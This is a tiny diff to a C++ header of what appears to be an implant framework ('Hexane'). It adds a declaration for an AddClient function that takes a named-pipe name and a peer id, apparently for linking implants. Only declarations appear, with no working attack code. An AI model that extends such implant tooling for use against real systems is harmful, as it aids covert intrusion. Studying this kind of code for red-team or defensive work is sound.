@@ -6,6 +6,7 @@
 #include <core/include/stdlib.hpp>
 
 namespace Clients {
+    FUNCTION BOOL AddClient(const wchar_t *pipe_name, uint32_t peer_id);
     FUNCTION VOID PushClients();
 }
 #endif //HEXANE_IMPLANT_CLIENTS_HPP
